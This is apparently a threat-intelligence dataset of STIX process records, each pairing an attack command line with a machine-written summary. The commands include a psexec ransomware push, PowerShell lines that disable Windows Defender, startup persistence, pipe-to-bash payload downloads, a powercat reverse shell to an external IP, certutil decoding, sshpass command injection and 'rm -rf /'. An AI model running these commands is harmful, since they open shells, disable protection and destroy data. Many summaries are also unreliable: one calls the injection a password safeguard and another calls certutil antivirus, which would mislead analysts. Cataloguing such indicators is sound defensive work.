+,cmd.exe /c $TEMP/psexec.exe -accepteula \\$SHARE -c -f $SHARE\vanlocker.exe -d --no-mounted --no-network < NUL,,,process--ebfca605-36ec-4bfe-87cc-bea3c6260b99,,,process,"The object contains a process record with limited information. 
+
+The process has an unknown binary reference and lacks a description or name. The command line provided for the process includes cmd.exe, psexec.exe, and various parameters such as -accepteula, -c, -f, -d, and -no-mounted -no-network.
+
+Additionally, there is no information available on the image or extensions associated with this process."
+,curl -s http://localhost:8000/index.html,,,process--5b2b282e-85d7-4f28-831f-0dbcd8f2b8b0,,,process,"The object contains a process with the following details:
+
+* It is not associated with a binary reference.
+* The command used to execute it is a curl command that accesses a local server running on port 8000 and displaying an HTML page at the root directory ('index.html').
+* No description of the process is provided.
+* There are no extensions or image information available for this process.
+
+This process has been identified with the unique identifier 'process--5b2b282e-85d7-4f28-831f-0dbcd8f2b8b0'."
+,sshpass -p 'password1$(echo pwned > /tmp/password)' ssh -o StrictHostKeyChecking=no root$(echo pwned > /tmp/username)@localhost -p 22 'id',,,process--36ab2f03-2db6-4ea2-8776-b8406c85cce3,,,process,"The object contains a detailed description of a process. 
+
+The process is created using the SSH command-line tool, which is used to establish a secure connection to a remote host. The command-line includes several options: -o StrictHostKeyChecking=no, which disables the strict host key checking feature, and -p 22, which specifies the port number.
+
+However, the most interesting part of this command-line is the use of the sshpass tool to authenticate using a password that is generated on the fly. The password is created by running the echo command with the string 'password1' and piping it to a file named 'password'. This allows the user to avoid directly entering their password, which reduces the risk of a password leak.
+
+The process also includes an additional command-line option, which uses the root username (with the same generated password) to execute the id command on the local host. The output of this command is not specified in the provided information.
+
+It's worth noting that the use of such techniques may be considered malicious or unauthorized by some systems administrators, as it bypasses the normal authentication mechanisms and relies on the ability to inject code into a legitimate process."
+,"cmd.exe /C ""timeout /T 30 >nul && copy /Y ""C:\Users\<USER>\Desktop\test.exe"" ""C:\Users\<USER>\AppData\Roaming\[0-9]{4}.exe"" && start """" ""C:\Users\<USER>\AppData\Roaming\[0-9]{4}.exe""",,,process--ce1d90ac-8fe2-4fc5-8c31-dbbfdf38d889,,cmd.exe,process,"The object contains a process detail entry for a Windows operating system process. The process is identified by its unique identifier 'process--ce1d90ac-8fe2-4fc5-8c31-dbbfdf38d889'. 
+
+This process is associated with the command line argument 'cmd.exe /C ""timeout /T 30 >nul && copy /Y ""C:\\Users\\<USER>\\Desktop\\test.exe"" ""C:\\Users\\<USER>\\AppData\\Roaming\\[0-9]{4}.exe"" && start """" ""C:\\Users\\<USER>\\AppData\\Roaming\\[0-9]{4}.exe""''. 
+
+The command line argument is a complex series of instructions that involves the following steps: 
+- The 'timeout /T 30' command waits for 30 seconds, or until the user presses Ctrl+C. However, the output is redirected to 'nul', meaning it is discarded.
+- The 'copy /Y' command copies the file 'C:\\Users\\<USER>\\Desktop\\test.exe' and renames it to '[0-9]{4}.exe'. 
+- The 'start """"' command starts a new process with the executable at 'C:\\Users\\<USER>\\AppData\\Roaming\\[0-9]{4}.exe', effectively copying the original file to a different location. 
+
+However, there is no description of what this process does or why it was started. It appears that the information required for determining its purpose has been excluded from the provided data."
+,"powershell -ExecutionPolicy Bypass -w hidden -command ""$app[0-9]{5}=[Environment]::GetFolderPath([Environment+SpecialFolder]::ApplicationData);Start-Sleep -Seconds 60;$ws = New-Object -ComObject WScript.Shell;$lnk = $ws.CreateShortcut($app[0-9]{5}+ '\Microsoft\Windows\Start Menu\Programs\Startup\[0-9]{4}.lnk');$lnk.TargetPath = '""C:\Users\<USER>\AppData\Roaming\[0-9]{4}.exe""';$lnk.Save()""",,,process--df3f8f1d-2fbc-4622-b34c-0841e28e26d5,,powershell.exe,process,"The object contains a process named powershell.exe with the following characteristics:
+
+It is a PowerShell script executed from the command line using the -ExecutionPolicy Bypass option to bypass security restrictions.
+
+The script uses the WScript.Shell COM object to create a shortcut in the Startup folder of the Start Menu. The target path of this shortcut points to an executable file located in the AppData/Roaming directory of a user's profile.
+
+Specifically, the script creates a shortcut with a filename that includes a five-digit number and saves it as [0-9]{4}.lnk in the specified location. The target path of this shortcut is set to C:\Users\<USER>\AppData\Roaming\[0-9]{4}.exe, where <USER> is the actual username.
+
+This process is likely used to run a custom executable file when the user logs in to Windows, possibly as part of a malware or backdoor infection."
+,"powershell.exe powershell -NoProfile -Command ""Set-MpPreference -DisableScanningNetworkFiles $true""",,,process--d1d5ccf2-20d6-4ef1-ab57-790121a0f1ca,,powershell.exe,process,The object contains a process named powershell.exe. The process is running the command_line command which disables scanning of network files using the Set-MpPreference cmdlet in PowerShell. The command-line is set to execute this specific command when run.
+,"powershell.exe powershell -NoProfile -Command ""Set-MpPreference -DisableRealtimeMonitoring $true""",,,process--af18742a-24d2-4c9a-ac49-0f7629903594,,powershell.exe,process,"The object contains a Windows process named 'powershell.exe' that was started using the PowerShell command line. The command used to start this process is 'powershell.exe powershell -NoProfile -Command ""Set-MpPreference -DisableRealtimeMonitoring $true""'. This command disables real-time monitoring for Windows Defender, which can help with system performance but may increase vulnerability to malware.
+
+The process was launched using the binary reference specified in the 'command_line' field of the data. Unfortunately, this reference is not available due to a missing value (represented by nan).
+
+There are no additional details provided about the process, such as its extensions or description."
+,"powershell.exe powershell -NoProfile -Command ""Set-MpPreference -DisableIOAVProtection $true""",,,process--ca585f31-cf1b-4a40-99bf-4cf131642a1c,,powershell.exe,process,"The object contains information about a process named PowerShell. The command-line argument provided is powershell.exe powershell -NoProfile -Command ""Set-MpPreference -DisableIOAVProtection $true"". This suggests that the process is being run in a way that disables IOAV protection, which might be used for antivirus purposes.
+
+Unfortunately, there is no information available about the start time of this process or its image hash. The description and extensions fields are also blank, indicating that there may not be any additional context or details provided about the process."
+,"powershell.exe powershell -NoProfile -Command ""Add-MpPreference -ExclusionPath $env:TEMP""",,,process--f205d0d6-4f74-4df2-a8b5-f3f64fd33b7b,,powershell.exe,process,"The object contains a process named 'powershell.exe' that is being tracked by the system. The command used to add an exclusion path for the temporary files of this process includes the PowerShell executable itself, indicating that it may be interacting with its own environment in some way.
+
+This process is not explicitly identified as a malicious entity, but rather as a standard component of the Windows operating system. Its behavior and purpose are likely related to managing temporary files and directories, as suggested by the exclusion path added to its preferences.
+
+The specifics of this process's functionality and any potential implications for system security or performance remain unclear without further context or information about the system on which it is running."
+,"cmd.exe /c ""C:\Users\<USER>\AppData\Local\Temp\\_MEI\*\data\PowerRun.exe regedit.exe /s C:\Users\<USER>\AppData\Local\Temp\\_MEI\*\data\Remove_SecurityComp.reg""",,,process--aacb5b15-ac55-4e54-af52-209cab75f4f2,,cmd.exe,process,"The object contains a process named 'cmd.exe' with the following details: 
+
+- The command line used to execute the process includes a batch file that runs another executable named PowerRun.exe and a registry modification script Remove_SecurityComp.reg. 
+- There is no binary reference provided for this process.
+- It does not have any described extensions.
+- The process itself is of type 'process'."
+,"cmd.exe /c ""del /f /q C:\Windows\WinSxS\FileMaps\[wow64|amd64]\_windows-defender\*.manifest""",,,process--fb735e3a-8a9f-4a46-a485-807f7dffa69f,,cmd.exe,process,"The object contains information about a Windows process named cmd.exe. The process is of type 'process' and is identified by the unique id process--fb735e3a-8a9f-4a46-a485-807f7dffa69f.
+
+The command line used to create or manage this process is 'cmd.exe /c ""del /f /q C:\\Windows\\WinSxS\\FileMaps\\[wow64|amd64]\\_windows-defender\\*.manifest""'. This command appears to be deleting certain files in the Windows WinSxS directory related to Windows Defender.
+
+The process does not have a binary reference, image, or description associated with it. It also lacks extensions and metadata such as timestamps."
+,"cmd.exe /c ""del /f /q C:\Windows\System32\SecurityHealthSystray.exe""",,,process--4908658d-e8d7-4a9e-b8e5-f2d36bbc10c9,,cmd.exe,process,"The object contains a Windows system process named cmd.exe. The process was executed using the command line 'cmd.exe /c ""del /f /q C:\\Windows\\System32\\SecurityHealthSystray.exe""', which attempts to delete an executable file located in the System32 directory of Windows. However, the actual deletion process is currently pending due to a null value associated with the binary_ref field."
+,"cmd.exe /c C:\Windows\system32\cmd.exe /c ""Powershell -noprofile -executionpolicy bypass -file C:\Users\<USER>\AppData\Local\Temp\\_MEI\*\data\RemoveSecHealthApp.ps1""",,,process--4ba66b7b-7d94-4bf7-beb7-b4bb72d79bc7,,cmd.exe,process,"The object contains a detailed description of a Windows process. The process is identified by the command line, which consists of a series of commands executed by the cmd.exe shell.
+
+The first part of the command line invokes another instance of cmd.exe to execute a PowerShell script. This is done using the /c option, which executes the specified command and terminates. The PowerShell script itself is launched with several parameters:
+
+- -noprofile: this parameter tells PowerShell not to load any profile files.
+- -executionpolicy bypass: this sets the execution policy for the script to ""bypass"", allowing scripts to run without restrictions.
+- -file C:\\Users\\<USER>\\AppData\\Local\\Temp\\\\_MEI\\*\\data\\RemoveSecHealthApp.ps1
+
+The script is located in a temporary directory on the user's local machine, which is accessible by the process. The script name suggests that it contains code to remove a security application.
+
+It is worth noting that the process type is specified as ""process"", and the image path is not available due to missing metadata fields."
+,"cmd.exe /c ""C:\Users\<USER>\AppData\Local\Temp\\_MEI\*\data\PowerRun.exe regedit.exe /s C:\Users\<USER>\AppData\Local\Temp\\_MEI\*\data\RemoveDefender.reg""",,,process--05a7d24b-9b99-43f2-8926-daac0a28c345,,cmd.exe,process,"The object contains a Windows process named cmd.exe that was launched using the command line. The process is associated with the PowerRun executable, which seems to be used for modifying registry settings. Specifically, it runs regedit.exe with the /s option, which suggests a mass deletion of defender-related registry entries.
+
+The command executed by the process is stored in a temporary file named RemoveDefender.reg, located in the user's AppData Local Temp directory. This implies that the system administrator intended to remove certain defender configurations or settings from the Windows registry.
+
+It's worth noting that the command line argument includes the /c option, which tells cmd.exe to execute the specified command and then terminate. This suggests that the process was designed to run a one-time task without persisting after completion."
+,"cmd.exe /c ""C:\Users\<USER>\AppData\Local\Temp\\_MEI\*\data\PowerRun.exe regedit.exe /s C:\Users\<USER>\AppData\Local\Temp\\_MEI\*\data\RemoveShellAssociation.reg""",,,process--0bb73382-18b9-4918-afb1-920a889009d5,,cmd.exe,process,"The object contains a process named 'cmd.exe' which is running on the system. The process was initiated by executing the command line script 'C:\\Users\\<USER>\\AppData\\Local\\Temp\\\\_MEI\\*\\data\\PowerRun.exe regedit.exe /s C:\\Users\\<USER>\\AppData\\Local\\Temp\\\\_MEI\\*\\data\\RemoveShellAssociation.reg'. 
+
+The process type is 'process', indicating that it is a system-level process. The image and binary reference fields are not available, which may indicate that this information is not relevant to the specific process or its metadata was not collected.
+
+There is no detailed information provided about the command line arguments, description, extensions, or other attributes of the process."
+,"Add-MpPreference -ExclusionPath ""C:\Users\admin\AppData\Local\Microsoft\Windows\dvm.exe""",,,process--c0e15473-afca-4a0c-9a7e-05b8f09720e7,,powershell.exe,process,"The object contains a process named 'powershell.exe'. It was detected through a command-line action that excluded the path 'C:\\Users\\admin\\AppData\\Local\\Microsoft\\Windows\\dvm.exe' from being monitored by the Windows Defender. This action suggests that the process is related to Microsoft's Windows Defender, specifically with regards to its exclusion or inclusion of certain system processes."
+,node setup_bun.js,,,process--e4f437c2-eb59-469d-b89f-d15726af142e,,,process,"The object contains a process with the following properties:
+
+- A command-line interface specified by 'node setup_bun.js'.
+- The property for extensions is currently not available.
+- There is no available information on the binary reference of this process.
+- No description or name has been provided for this process."
+,curl -fsSL https://bun.sh/install | bash,,,process--f9bbdb8d-b6a5-4e81-a776-5021222f7eea,,,process,"The object contains a detailed structure of a process, which includes various attributes that describe its characteristics. Here is a summary of the data:
+
+The process is defined by the 'type' attribute, which indicates that it belongs to the category of processes.
+
+The presence or absence of certain attributes suggests that this process might be related to running and managing system resources. The 'command_line' field provides information about how to run or manage the process, indicating that it involves executing a specific command-line instruction using curl and bash.
+
+Additionally, some fields are currently set to ""nan"" (Not a Number), which could indicate missing or uninitialized data. These include ""binary_ref"", ""description"", ""extensions"", and ""image"". This suggests that more detailed information about the process is available, but it has not been incorporated into this particular structure.
+
+It's worth noting that this structure appears to be related to an open-source project called Bun (Build Your Own Node), given the presence of a specific command-line instruction in the 'command_line' field."
+,"powershell -c ""irm bun.sh/install.ps1|iex""",,,process--669b2796-592a-43c9-97e5-a7aa027f5b13,,,process,"The object contains information about a process that was executed using PowerShell. The command used to run the process is: 
+
+powershell -c ""irm bun.sh/install.ps1|iex""
+
+This command uses the `irm` command to download and execute an installation script named `install.ps1` from the `bun.sh` file, which is likely a binary that contains the executable code. The `|iex` part pipes the output of the `irm` command into PowerShell, allowing it to execute the downloaded script.
+
+However, there seems to be some issues with the data as 'binary_ref', 'description', 'extensions', and 'image' fields are not filled."
+,curl -o actions-runner-linux-x64-2.330.0.tar.gz -L https://github.com/actions/runner/releases/download/v2.330.0/actions-runner-linux-x64-2.330.0.tar.gz,,,process--d8d37519-9107-483f-8e87-b31c142375cc,,,process,"The object contains a JSON-like data structure representing a GitHub Actions runner process. The key details about the runner include:
+
+- It is not associated with any specific binary reference.
+- A command line was used to download the runner: 'curl -o actions-runner-linux-x64-2.330.0.tar.gz -L https://github.com/actions/runner/releases/download/v2.330.0/actions-runner-linux-x64-2.330.0.tar.gz'.
+- The description of the runner is not provided.
+- This runner does not utilize any extensions.
+- Its name and image are unknown.
+
+This process represents a specific instance of a GitHub Actions runner, which can be used to run tasks on a Linux-based system."
+,tar xzf ./actions-runner-linux-x64-2.330.0.tar.gz,,,process--ae349b5f-3741-4e6d-bd80-a4f47ac5af1a,,,process,"The object contains a detailed properties summary for an 'actions-runner-linux-x64-2.330.0.tar.gz' file.
+
+Key information includes:
+
+*   Command-line instructions to extract the tarball: 'tar xzf ./actions-runner-linux-x64-2.330.0.tar.gz'.
+*   The type of process is classified as a process.
+*   However, some essential metadata fields such as image and name were left blank."
+,"RUNNER_ALLOW_RUNASROOT=1 ./config.sh --url https://github.com/${owner}/${repo} --unattended --token ${token} --name ""SHA1HULUD""",,,process--edb24604-8e6a-4d52-a87b-1a5743c43755,,,process,"The object contains a Docker process definition. The details of the process are as follows:
+
+- It does not require any binary reference, as this field is currently set to NaN (Not A Number).
+- The command line used to run the process is 'RUNNER_ALLOW_RUNASROOT=1 ./config.sh --url https://github.com/${owner}/${repo} --unattended --token ${token} --name ""SHA1HULUD""'. This command seems to be a script that uses GitHub API and Docker credentials to fetch data from a specified repository.
+- The description of the process is not available, as this field is currently set to NaN.
+- There are no additional extensions defined for this process.
+- A unique identifier has been assigned to the process, which is 'process--edb24604-8e6a-4d52-a87b-1a5743c43755'.
+- The Docker image used by this process is not specified, as this field is currently set to NaN.
+- The name of the process is unknown, as this field is currently set to NaN.
+- The type of the process is 'process', indicating that it's a system process."
+,"powershell -ExecutionPolicy Bypass -Command ""Invoke-WebRequest -Uri https://github.com/actions/runner/releases/download/v2.330.0/actions-runner-win-x64-2.330.0.zip -OutFile actions-runner-win-x64-2.330.0.zip""",,,process--c1cb5b49-286d-472e-bea2-02b58fc7468e,,,process,"The object contains a process entity with the following characteristics:
+
+* The process is executed on a Windows environment as indicated by the presence of actions-runner-win-x64.
+* A PowerShell script is used to download a specific version (2.330.0) of the Actions Runner from GitHub, specifically targeting a 32-bit x64 executable.
+* The command-line instruction bypasses the default execution policy restrictions and uses the Invoke-WebRequest cmdlet to initiate the download.
+* No additional metadata such as binary references, image information, or extensions are available for this process entity."
+,"powershell -ExecutionPolicy Bypass -Command ""Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory(\""actions-runner-win-x64-2.330.0.zip\"", \"".\"")""",,,process--a3ef06d8-257b-4fe4-bfec-ffd41d9068bf,,,process,"The object contains a process entry with the following details:
+
+*   A command line that executes PowerShell, bypassing execution policy restrictions, to extract a zip file.
+*   The zip file is extracted to the current directory using the `ZipFile` class from the `System.IO.Compression.FileSystem` assembly.
+*   The process ID and image hash are not specified in this entry."
+,"./config.cmd --url https://github.com/${owner}/${repo} --unattended --token ${token} --name ""SHA1HULUD""",,,process--4308dfd0-4f3f-4f40-8253-a38537d2704d,,,process,"The object contains a process object with the following characteristics:
+
+* The process is not associated with a binary reference.
+* A command line argument is provided to run a configuration file using the ./config.cmd tool. The command includes several options and parameters, including:
+ + Specifying the GitHub repository URL as https://github.com/${owner}/${repo}.
+ + Enabling unattended execution.
+ + Using a specific token for authentication.
+ + Naming the process ""SHA1HULUD"".
+* The description of the process is not available.
+* The extensions or additional information associated with the process are also not provided.
+* A unique identifier for the process, 'process--4308dfd0-4f3f-4f40-8253-a38537d2704d', is present but its meaning is unclear without further context."
+,curl -o actions-runner-osx-arm64-2.330.0.tar.gz -L https://github.com/actions/runner/releases/download/v2.330.0/actions-runner-osx-arm64-2.330.0.tar.gz,,,process--f7c8d8a7-bd64-4adb-aebb-92a06e9efd45,,,process,"The object contains a set of key-value pairs representing a GitHub Actions runner. The details provided include:
+
+- No binary reference is available.
+- A command line was used to download the runner, specifically `curl`, which fetched the latest version (v2.330.0) from the GitHub releases page for macOS ARM64 architecture.
+
+The runner's configuration does not specify any description or extensions, implying that these are either missing or not relevant to this particular instance.
+
+Its purpose is classified as a 'process' type of action.
+
+No specific image details are mentioned."
+,tar xzf ./actions-runner-osx-arm64-2.330.0.tar.gz,,,process--da42028d-631a-43a8-b955-d2535be9fbb1,,,process,"The object contains a process metadata summary. The details of the process are as follows:
+
+The process is identified by an unique identifier, 'process--da42028d-631a-43a8-b955-d2535be9fbb1', which seems to be generated based on various parameters such as command line and description.
+
+The process does not have a specified image or extension type. This information is crucial for identifying the process in a specific context, but it appears to be missing from this metadata summary.
+
+However, the most notable aspect of this process is its command line specification. The command line provided is 'tar xzf ./actions-runner-osx-arm64-2.330.0.tar.gz', indicating that this process is related to extracting data from a tarball file using the 'tar' command.
+
+It is worth noting that certain fields such as binary_ref, description, extensions, image, and name are empty or not specified, which might make it challenging to determine more specific details about this process without further context."
+,"./config.sh --url https://github.com/${owner}/${repo} --unattended --token ${token} --name ""SHA1HULUD""",,,process--0a5b3a49-5b81-42e9-9a79-e5cf3e00194f,,,process,"The object contains metadata related to a process. The relevant information includes:
+
+*   Command Line: The process was started using the './config.sh' script, which executed a Git command to clone the specified repository from GitHub. The URL of the repository was provided as 'https://github.com/${owner}/${repo}'. The '--unattended' flag was used to prevent user interaction, and the '--token ${token}' flag specified an authentication token for access. A custom name ""SHA1HULUD"" was given to the process.
+
+*   No information is available about the description, extensions, or image associated with this process.
+
+*   The type of this object is a 'process'."
+,~/.helper,,,process--d28027dc-14e8-4d7e-87d3-c00c860b4bfd,,,process,"The object contains a process with the following characteristics:
+
+* The command to run the process is located at ""~/.helper"", indicating that it is stored in a personal configuration file.
+* No further information about the process can be retrieved due to missing fields such as its name, description, or extensions."
+,am start -n com.eltechs.originaldoom/.doomDemo.DoomDemo,Process launched by injected shellcode to start the DOOM application on the AP.,,process--de7bca72-c725-4da9-bb5c-cfc0ab0cfe32,,,process,"The object contains a process launched by injected shellcode to start the DOOM application on a Android Platform (AP). The command used to launch the process is 'am start -n com.eltechs.originaldoom/.doomDemo.DoomDemo'. This process is described as being started from an injected shellcode, implying that it was part of a malicious or unauthorized activity."
+,getpriority,System call hooked in the Linux kernel to trigger execution of injected shellcode.,,process--27a03922-4606-413c-80d4-5bd8004d2f7a,,,process,"The object contains information about a specific system call, which is part of a Linux kernel hook. The system call is named ""getpriority"" and its purpose is to trigger the execution of injected shellcode.
+
+This particular instance of the system call is associated with a process that has been identified by a unique identifier. Unfortunately, this identification information is not available due to missing data in the object.
+
+The object does not provide any additional information about the process or the injected shellcode itself. The only relevant details are the name of the system call and its purpose as described in the Linux kernel documentation.
+
+Overall, the object appears to be a partial record of a system call that has been hooked in order to facilitate the execution of malicious code."
+,/usr/lib/dev/systemdev/dns-filter -o [host] --tls,,,process--fa0dba25-6929-4d44-ac7e-767e90675265,,,process,"The object contains information about a process with the following characteristics:
+
+* The process type is categorized as a ""process"".
+* No specific description or details are provided.
+* There is no clear connection to a binary reference or image associated with this process.
+* A command line was executed to manage this process, which involves running the `dns-filter` tool in a specific configuration mode. 
+* The exact host name for which the filter was applied is not specified.
+
+Overall, the object seems to be incomplete or missing key information regarding the process being described."
+,"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(([host],[port]));",,,process--8918f90b-6eb8-4038-a771-2415858b6451,,,process,"The object contains a binary reference field that is not populated with any value.
+
+The command line associated with this process is a Python script that utilizes the socket library to establish a connection to a specific host and port. The script connects to the target host and port, suggesting that it may be used for malicious purposes such as reconnaissance or data exfiltration.
+
+There is no description available for this process.
+
+No extensions are listed for this process.
+
+The image associated with this process is not provided.
+
+The name of the process is not specified.
+
+The type of this process is classified as a ""process""."
+,./sockstress eth0 -p payloads/http,,,process--0fe1b436-8c8e-4459-bb90-9ffd81959221,,,process,"The object contains a process-related data structure. The details of the process are as follows:
+
+The process has an undefined binary reference.
+A command line is specified, which includes the execution of the `sockstress` tool to simulate HTTP traffic on the `eth0` network interface with payloads.
+There is no description provided for this process.
+No extensions or other metadata are associated with this process.
+The process ID is uniquely identified as a string."
+,/bin/bash /var/tmp/.ddns.sh,,,process--e516e44d-7990-4cee-9214-acd6b0aab344,,,process,"The object contains a process metadata record. The details of this process are as follows:
+
+- It lacks an identifier field.
+
+- The command line associated with the process is '/bin/bash /var/tmp/.ddns.sh'.
+
+- There is no available binary reference for the process.
+
+- The description, extensions, and image related to the process are currently unknown.
+
+- The type of the process is specified as 'process'."
+,curl bwqqvqfgsseplyoltois92rdukv0mm5th.oast.fun,,,process--fab2f1a6-39bf-4fd1-87f5-213974e98b9f,,,process,"The object contains a process with the following characteristics:
+
+It is a binary process, which means it can be executed directly by the system without requiring additional interpretation.
+However, its binary reference field is currently set to NaN, indicating that this information is not available or has been recorded as an error.
+The command line used to execute this process was specified as 'curl bwqqvqfgsseplyoltois92rdukv0mm5th.oast.fun', suggesting a web-based task.
+Unfortunately, the description of this process is missing, which could provide further context about its purpose or nature.
+There are no extensions associated with this process, which may imply that it does not have any additional features or components beyond its core functionality.
+The image field for this object is also empty, possibly due to a lack of relevant visual data or because the information was not recorded."
+,disown,,,process--3982f5c3-891c-4ea0-b7ce-860c90010709,,,process,"The object contains a process with the following characteristics:
+
+The process is identified by its unique identifier, which is not provided due to unknown reasons.
+
+The type of this process is specified as 'process', indicating that it belongs to a group of similar processes.
+
+No information is available regarding the name or description of this process.
+
+A specific command line was executed in order to disown this process."
+,uname -a,,,process--182f9e83-896d-49f8-910e-126cd205d532,,,process,"The object contains information about a process. It includes details related to its type, which is specified as 'process'. There are several other fields present in the data, however, they are currently empty or contain null values, such as 'binary_ref', 'description', 'extensions', and 'image'."
+,id,,,process--0a9a1b9f-49b1-4e7a-84fa-6c811f3c9f06,,,process,"The object contains a process detail summary. 
+
+The process has an identifier of 'process--0a9a1b9f-49b1-4e7a-84fa-6c811f3c9f06'. This process lacks detailed information as most fields are represented by 'nan' (not applicable), indicating missing or undefined data. 
+
+The only other available field is the command line argument, which indicates that the process was initiated with the command 'id'."
+,wget -O - https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/mon.sh | bash,,,process--39f55101-3aaf-4b3d-913e-e3270eea7a2f,,,process,"The object contains a detailed specification of a process, which includes several key elements.
+
+There is no binary reference available for this process. 
+
+A command line has been provided to automate the process, which uses wget to retrieve a script named mon.sh from a GitLab repository and then executes it using bash. 
+
+Unfortunately, there is no description or information about what the process does or its purpose. 
+
+No file extensions are specified for this process.
+
+The main part of the specification is that it involves a process with an ID assigned by the system, but unfortunately, the actual value is not provided here."
+,curl -s https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/mon.sh | bash,,,process--e94e8de2-1950-4ad3-9bfa-338df8d4b44b,,,process,"The object contains a process metadata entry. The process has an id of 'process--e94e8de2-1950-4ad3-9bfa-338df8d4b44b'. Unfortunately, the value for the 'binary_ref' field is missing as it is represented by NaN (Not A Number)."
+,"wget -qO- https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/aa.sh | tr -d ""\r"" > aa_clean.sh && chmod +x aa_clean.sh && ./aa_clean.sh",,,process--6c6eec69-0ea4-46af-8a21-3bb6f4887635,,,process,"The object contains a detailed description of the data field 'command_line'. 
+
+The command line provided is a bash script that performs several tasks to clean up an executable file. It first downloads a script from a GitLab repository using the wget command. The downloaded script is then piped through the tr command, which removes newline characters from the end of each line. This results in the contents of the original file being written to a new file called 'aa_clean.sh'. 
+
+The next step is to change the permissions of this new file using the chmod command so that it can be executed directly. Finally, the script is run with the ./ operator to execute the commands within.
+
+Here's a breakdown of each line and the steps involved:
+
+1. wget -qO- https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/aa.sh
+   The wget command is used to download the contents of 'aa.sh' from the specified URL. 
+
+2. | tr -d ""\\r""
+   This line pipes the downloaded script into the tr command, which removes newline characters from each character.
+
+3. > aa_clean.sh
+   The result of this process is redirected to a new file called 'aa_clean.sh'.
+
+4. && chmod +x aa_clean.sh
+   After successfully writing to the new file, the next step is to change the permissions using the chmod command so that it can be executed directly.
+
+5. && ./aa_clean.sh 
+   The final step is to execute the newly created executable file using the ./ operator."
+,"echo ""kworker/0:0"" > /proc/$$/comm",,,process--8c356616-98ab-482f-9718-eccb87a51d4f,,,process,"The object contains a detailed record of a process, providing information about its characteristics and behavior. 
+
+A specific process is identified by the identifier 'process--8c356616-98ab-482f-9718-eccb87a51d4f'. The process type is categorized as 'process', indicating that it belongs to this class of system processes.
+
+The process command line, denoted as 'command_line', reveals its functional purpose. The provided command line instructs the system to write a string to a file in order to determine the name of the process running on the machine. In essence, this command line facilitates identification and tracking of the current process by writing it's own name into /proc/$$/comm.
+
+The absence of values in 'binary_ref', 'description', 'extensions', and 'image' fields suggests that these pieces of information may not be readily available or relevant to the specific details of this particular process."
+,powershell.exe -c IEX (New-Object System.Net.WebClient).DownloadString ('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 154.17.26.41 -p 8080 -e cmd,,,process--9647016d-d742-48d7-abf4-12e6917b39a9,,,process,"The object contains a detailed description of a malicious PowerShell process. The details provided include:
+
+* The command line used to launch the process: powershell.exe -c IEX (New-Object System.Net.WebClient).DownloadString ('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 154.17.26.41 -p 8080 -e cmd.
+* The process type, which is 'process', indicating that it is a running application or service.
+
+Further information is not available due to the presence of null values in the object for fields such as binary_ref, description, extensions, and image."
+,curl hxxp://149.28.78.189:42306/tmp.txt -o C:\users\%ASD%\tmp.txt,,,process--d3b86e65-63f0-419e-8080-820735cf2565,,,process,"The object contains a process with the following characteristics:
+
+It does not have a valid binary reference. The binary reference is indicated as NaN (not a number), indicating that it cannot be determined or is invalid.
+
+The command-line instruction for this process is available, and it involves using the ""curl"" command to download a file from a specified URL and save it to a local file path. The specific URL is: curl hxxp://149.28.78.189:42306/tmp.txt -o C:\\users\\%ASD%\\tmp.txt
+
+Unfortunately, there is no description provided for this process.
+
+The extensions of the downloaded file are not specified.
+
+There is no available information regarding the type or name of this process.
+
+This process can be classified as a ""process"" due to its nature."
+,curl hxxp://149.28.78.189:42306/dll.txt -o C:\users\%ASD%\dll.txt,,,process--87e19191-5d7b-4161-8727-2bed063e1880,,,process,"The object contains a process with the following characteristics:
+
+It is a binary file that was downloaded from a specific URL using the curl command. The exact location of the download is stored in the 'command_line' field, which includes the IP address 149.28.78.189 and a specific port number (42306). 
+
+The name of the process's DLL file is stored on the local computer, located at C:\users\%ASD%\dll.txt. The %ASD% placeholder in the path suggests that this might be related to an automated system or script.
+
+No additional information about the process itself can be determined from the given data."
+,curl hxxp://149.28.78.189:42306/exe.txt -o C:\users\%ASD%\exe.txt,,,process--b6454cb9-0a66-4188-93e3-72c14aafc5b2,,,process,"The object contains a process with an ID of 'process--b6454cb9-0a66-4188-93e3-72c14aafc5b2'. The process is identified by the command line string 'curl hxxp://149.28.78.189:42306/exe.txt -o C:\\users\\%ASD\\exe.txt', which suggests that it is related to a file download operation.
+
+The details of the process are as follows:
+
+- There is no specific information about the binary reference, and its value is represented by 'nan'.
+- The description of the process is not available.
+- No specific information regarding the extensions associated with this process can be determined.
+- The image or executable path of the process is not specified.
+- The name of the process itself is unknown.
+
+Overall, the provided data gives a general idea about the nature and details of the identified process. However, certain key aspects, such as the actual contents of the downloaded file (exe.txt) and any relevant metadata that might be related to this process, are missing or not available in the given context."
+,certutil -decode C:\users\%ASD%\tmp.txt C:\programdata\0C137A80.tmp,,,process--407083b6-549f-4d0f-b1a6-52806634b47f,,,process,"The object contains information related to a process that was executed on a system. The details of this process are as follows:
+
+The command line used for the process execution is 'certutil -decode C:\\users\\%ASD\\tmp.txt C:\\programdata\\0C137A80.tmp'. This command appears to be part of an antivirus software, with 'certutil' being a utility that decodes binary files.
+
+The file path specified in the command is C:\users\%\ASD%\tmp.txt. The '\%ASD%' notation suggests that this path is likely to contain a placeholder for the actual username or user name format specific to the system.
+
+There is no further information available about the process, such as its description, image, binary reference, extensions, or name, since these fields are empty or null (nan)."
+,kinit -kt /etc/krb5.keytab user; rm -rf /; echo pwned,,,process--24fdfadb-46b7-498d-9577-a240dc7b3121,,kinit,process,"The object contains a detailed analysis of a malicious process titled ""kinit"" with an ID of 'process--24fdfadb-46b7-498d-9577-a240dc7b3121'. 
+
+This process is identified as being related to the Kerberos authentication protocol, with a command line that reveals its intention. The command line provided is 'kinit -kt /etc/krb5.keytab user; rm -rf /; echo pwned', which indicates that the program's purpose seems to be exploiting the system's kerberos configuration.
+
+The command line starts by creating a key tab file for Kerberos authentication, followed by the deletion of all files on the system using 'rm -rf /' which is an operating system crash command and can potentially cause severe damage. The final action executed by the process is to print the string ""pwned"".
+
+There are no known extensions or description associated with this malicious process in the provided data."
